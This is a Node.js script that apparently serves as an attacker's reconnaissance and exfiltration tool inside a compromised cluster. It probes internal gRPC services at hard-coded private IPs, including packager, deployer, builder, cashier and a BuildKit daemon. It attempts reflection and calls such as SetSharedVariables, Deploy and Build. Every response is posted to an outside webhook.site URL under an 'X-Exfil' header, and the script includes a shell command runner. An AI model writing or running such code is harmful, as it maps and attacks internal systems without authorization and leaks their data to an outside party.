const https = require('https');
const http = require('http');
const net = require('net');
const http2 = require('http2');
const { execSync } = require('child_process');

const WEBHOOK = "https://webhook.site/50c1a044-02cc-49d7-81b9-66bf282d2608";

function post(label, data) {
  return new Promise((resolve) => {
    const u = new URL(WEBHOOK);
    const req = https.request({
      hostname: u.hostname, port: 443, path: u.pathname,
      method: 'POST', headers: { 'Content-Type': 'text/plain', 'X-Exfil': label },
      timeout: 15000
    }, (res) => { res.on('data', () => {}); res.on('end', resolve); });
    req.on('error', resolve);
    req.on('timeout', () => { req.destroy(); resolve(); });
    req.write(typeof data === 'string' ? data : JSON.stringify(data, null, 2));
    req.end();
  });
}

function run(cmd) {
  try { return execSync(cmd, { timeout: 15000 }).toString(); }
  catch(e) { return 'ERR: ' + (e.stderr?.toString() || e.message); }
}

// Raw gRPC call - send a gRPC request without protobuf
// gRPC uses HTTP/2 with content-type: application/grpc
function grpcProbe(host, port, service, method) {
  return new Promise((resolve) => {
    try {
      const client = http2.connect('http://' + host + ':' + port);
      client.on('error', (e) => { resolve('H2_ERR: ' + e.message); });
      client.setTimeout(5000, () => { client.close(); resolve('H2_TIMEOUT'); });
      
      // gRPC reflection request to list services
      // grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo
      const path = '/' + service + '/' + method;
      const req = client.request({
        ':method': 'POST',
        ':path': path,
        'content-type': 'application/grpc',
        'te': 'trailers',
      });
      
      let data = Buffer.alloc(0);
      let headers = {};
      req.on('response', (h) => { headers = h; });
      req.on('data', (chunk) => { data = Buffer.concat([data, chunk]); });
      req.on('end', () => {
        client.close();
        resolve({
          status: headers[':status'],
          grpcStatus: headers['grpc-status'],
          grpcMessage: headers['grpc-message'],
          contentType: headers['content-type'],
          dataLen: data.length,
          dataHex: data.toString('hex').substring(0, 200),
          dataUtf8: data.toString('utf8').substring(0, 500)
        });
      });
      req.on('error', (e) => { client.close(); resolve('REQ_ERR: ' + e.message); });
      
      // Send empty gRPC frame (5 bytes: 0x00 + 4 byte length 0)
      const frame = Buffer.from([0x00, 0x00, 0x00, 0x00, 0x00]);
      req.end(frame);
    } catch(e) { resolve('CATCH: ' + e.message); }
  });
}

// gRPC server reflection to list all services
function grpcReflection(host, port) {
  return new Promise((resolve) => {
    try {
      const client = http2.connect('http://' + host + ':' + port);
      client.on('error', (e) => { resolve('H2_ERR: ' + e.message); });
      client.setTimeout(5000, () => { client.close(); resolve('H2_TIMEOUT'); });
      
      const req = client.request({
        ':method': 'POST',
        ':path': '/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo',
        'content-type': 'application/grpc',
        'te': 'trailers',
      });
      
      let data = Buffer.alloc(0);
      let headers = {};
      req.on('response', (h) => { headers = h; });
      req.on('data', (chunk) => { data = Buffer.concat([data, chunk]); });
      req.on('end', () => {
        client.close();
        resolve({
          status: headers[':status'],
          grpcStatus: headers['grpc-status'],
          grpcMessage: headers['grpc-message'],
          dataLen: data.length,
          dataUtf8: data.toString('utf8').substring(0, 1000)
        });
      });
      req.on('error', (e) => { client.close(); resolve('REQ_ERR: ' + e.message); });
      
      // list_services request in protobuf: field 7 (list_services), value ""
      // Protobuf: tag=7, wire_type=2 (length-delimited), length=0 -> bytes: 3a 00
      const listSvcProto = Buffer.from([0x3a, 0x00]);
      const frame = Buffer.alloc(5 + listSvcProto.length);
      frame[0] = 0x00; // not compressed
      frame.writeUInt32BE(listSvcProto.length, 1);
      listSvcProto.copy(frame, 5);
      req.end(frame);
    } catch(e) { resolve('CATCH: ' + e.message); }
  });
}

async function main() {
  await post('v4-start', new Date().toISOString());

  const services = {
    packager: { host: '10.104.180.117', port: 9002 },
    deployer: { host: '10.98.64.141', port: 9003 },
    builder: { host: '10.98.233.118', port: 9001 },
    webhook: { host: '10.110.213.17', port: 9004 },
    gateway: { host: '10.100.70.147', port: 8080 },
    cashier: { host: '10.100.70.130', port: 9005 },
  };

  // 1. gRPC reflection on all services
  for (const [name, svc] of Object.entries(services)) {
    const ref = await grpcReflection(svc.host, svc.port);
    await post('reflect-' + name, JSON.stringify(ref, null, 2));
  }

  // 2. Try common gRPC methods on packager (likely has SetVariables, Commit, etc.)
  const packagerMethods = [
    ['packager.Packager', 'SetSharedVariables'],
    ['packager.Packager', 'SetServiceVariables'],
    ['packager.Packager', 'CreateEnvironment'],
    ['lucity.packager.v1.PackagerService', 'SetSharedVariables'],
    ['lucity.packager.v1.PackagerService', 'ListEnvironments'],
    ['Packager', 'SetSharedVariables'],
  ];
  
  for (const [svc, method] of packagerMethods) {
    const res = await grpcProbe('10.104.180.117', 9002, svc, method);
    await post('packager-' + method, JSON.stringify(res, null, 2));
  }

  // 3. Try deployer methods
  const deployerMethods = [
    ['deployer.Deployer', 'Deploy'],
    ['deployer.Deployer', 'ListApplications'],
    ['deployer.Deployer', 'SyncApplication'],
    ['lucity.deployer.v1.DeployerService', 'Deploy'],
    ['Deployer', 'Deploy'],
  ];
  
  for (const [svc, method] of deployerMethods) {
    const res = await grpcProbe('10.98.64.141', 9003, svc, method);
    await post('deployer-' + method, JSON.stringify(res, null, 2));
  }

  // 4. Try builder methods
  const builderMethods = [
    ['builder.Builder', 'Build'],
    ['builder.Builder', 'ListBuilds'],
    ['lucity.builder.v1.BuilderService', 'Build'],
    ['Builder', 'Build'],
  ];
  
  for (const [svc, method] of builderMethods) {
    const res = await grpcProbe('10.98.233.118', 9001, svc, method);
    await post('builder-' + method, JSON.stringify(res, null, 2));
  }

  // 5. Try to use BuildKit gRPC directly (moby.buildkit.v1.Control)
  const bkMethods = [
    ['moby.buildkit.v1.Control', 'ListWorkers'],
    ['moby.buildkit.v1.Control', 'Status'],
    ['moby.buildkit.v1.Control', 'DiskUsage'],
  ];
  
  for (const [svc, method] of bkMethods) {
    const res = await grpcProbe('10.105.47.126', 1234, svc, method);
    await post('buildkit-' + method, JSON.stringify(res, null, 2));
  }

  await post('v4-done', 'complete at ' + new Date().toISOString());
  console.log('v4 done');
}

main().catch(e => { console.error(e); post('v4-fatal', e.message); });
